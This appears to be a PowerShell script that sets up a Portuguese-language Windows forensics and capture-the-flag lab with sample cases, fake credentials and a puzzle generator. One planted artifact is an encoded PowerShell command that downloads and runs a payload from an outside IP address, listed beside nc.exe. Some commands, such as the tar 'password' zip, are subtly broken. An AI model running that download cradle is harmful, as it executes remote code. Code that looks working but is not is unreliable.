# setup-lab.ps1
Write-Host "========================================" -ForegroundColor Green
Write-Host "🔧 Configurando Laboratório Windows Forense" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green

# Criar estrutura de diretórios
Write-Host "[1/5] Criando diretórios..." -ForegroundColor Yellow
New-Item -ItemType Directory -Path "C:\Cases\Case001" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Cases\Case002" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Cases\Case003" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Tools\Forense" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Tools\Estego" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Tools\Cripto" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Tools\Rede" -Force | Out-Null

# Criar arquivos de exemplo
Write-Host "[2/5] Criando arquivos de exemplo..." -ForegroundColor Yellow

# Arquivo de texto com flag
"flag{windows_forense_exemplo}" | Out-File -FilePath "C:\Cases\Case001\flag.txt"

# Arquivo com senha
@"
usuário: administrador
senha: admin123
"@ | Out-File -FilePath "C:\Cases\Case001\credenciais.txt"

# Log de eventos simulado
@"
2024-03-15 10:15:23 - Logon bem-sucedido - usuário: administrador
2024-03-15 10:16:45 - Falha de logon - usuário: hacker - senha: 123456
2024-03-15 10:17:01 - Processo criado: C:\Users\Public\malware.exe
"@ | Out-File -FilePath "C:\Cases\Case001\Security.evtx"

# Lista de processos
@"
Processos suspeitos:
  PID 1337 - malware.exe
  PID 4444 - nc.exe
  PID 6666 - powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAxADYANQAuADIAOQAuADEAMAAxAC8AcABhAHkAbABvAGEAZAAnACkA
"@ | Out-File -FilePath "C:\Cases\Case002\processos.txt"

# Criar script do gerador CTF para Windows
Write-Host "[3/5] Criando gerador CTF..." -ForegroundColor Yellow

@"
@echo off
echo =================================
echo 🧩 GERADOR DE PUZZLES CTF
echo =================================
echo.

set OUTPUT=C:\Cases\Generated
if not exist %OUTPUT% mkdir %OUTPUT%

echo [1] Gerando desafio BASE64
echo flag{base64_%random%} | openssl base64 > %OUTPUT%\base64.txt

echo [2] Gerando desafio HASH
echo flag{hash_%random%} | openssl md5 > %OUTPUT%\hash.txt

echo [3] Gerando desafio ZIP
echo flag{zip_%random%} > %OUTPUT%\temp.txt
tar -cf %OUTPUT%\protected.zip -P 1234 %OUTPUT%\temp.txt
del %OUTPUT%\temp.txt

echo.
echo 📁 Desafios gerados em: %OUTPUT%
echo =================================
echo "Alguns desafios não existem ainda."
echo "O verdadeiro investigador cria os próprios."
echo =================================
"@ | Out-File -FilePath "C:\Tools\generate-ctf.bat" -Encoding ASCII

# Criar lista de ferramentas recomendadas
Write-Host "[4/5] Criando lista de ferramentas..." -ForegroundColor Yellow

@"
========================================
🔧 FERRAMENTAS RECOMENDADAS - WINDOWS
========================================

📌 FORENSE:
  - FTK Imager: https://www.exterro.com/ftk-imager
  - Autopsy: https://www.autopsy.com/download/
  - Process Monitor: https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
  - HxD Hex Editor: https://mh-nexus.de/en/hxd/

📌 ESTEGANOGRAFIA:
  - StegSolve: https://github.com/zardus/ctf-tools/blob/master/stegsolve/install
  - Steghide: https://steghide.sourceforge.net/
  - ExifTool: https://exiftool.org/

📌 CRIPTOGRAFIA:
  - HashCalc: http://www.slavasoft.com/hashcalc/
  - John the Ripper: https://www.openwall.com/john/
  - HashCat: https://hashcat.net/hashcat/

📌 REDE:
  - Wireshark: https://www.wireshark.org/download.html
  - Nmap: https://nmap.org/download.html
  - PuTTY: https://www.putty.org/

📌 LABORATÓRIO:
  - Comando: C:\Tools\generate-ctf.bat
  - Output: C:\Cases\Generated\
"@ | Out-File -FilePath "C:\Tools\README.txt"

# Adicionar ao PATH
Write-Host "[5/5] Configurando ambiente..." -ForegroundColor Yellow
$env:Path += ";C:\Tools"
[Environment]::SetEnvironmentVariable("Path", $env:Path, [EnvironmentVariableTarget]::Machine)

Write-Host "========================================" -ForegroundColor Green
Write-Host "✅ LABORATÓRIO CONFIGURADO!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "📌 Comandos disponíveis:"
Write-Host "   generate-ctf - Gerar novos puzzles"
Write-Host "   Os arquivos serão salvos em: C:\Cases\Generated\"
Write-Host ""
Write-Host "\"Alguns desafios não existem ainda.\""
Write-Host "\"O verdadeiro investigador cria os próprios.\""
Write-Host ""
